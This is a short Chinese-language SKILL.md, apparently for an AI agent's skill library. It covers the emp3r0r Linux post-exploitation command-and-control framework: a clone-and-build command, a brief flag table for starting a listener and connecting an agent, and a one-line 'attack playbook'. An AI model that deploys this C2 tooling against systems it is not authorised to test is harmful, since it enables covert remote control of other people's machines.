---
name: emp3r0r-c2
description: 渗透工具 skill:emp3r0r 的安装、参数速查与攻击场景 playbook。当任务涉及 C2框架与远控 需要调用 emp3r0r 时使用。
---

# emp3r0r

- 攻击大类:C35 C2框架与远控
- 上游仓库:https://github.com/jm33-m0/emp3r0r
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/jm33-m0/emp3r0r && cd emp3r0r && ./build.sh
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./emp3r0r -l 0.0.0.0:8080` | 起服务端 |
| `./emp3r0r -connect 10.0.0.5:8080` | agent 连接 |
| `-m` | 模块 |

## 攻击场景 Playbook

### Linux 后渗透 C2

```bash
./emp3r0r -l 8080
# 国产 C2,Linux 渗透利器
```

## 注意事项

jm33-m0 出品,Linux 渗透 C2 框架。
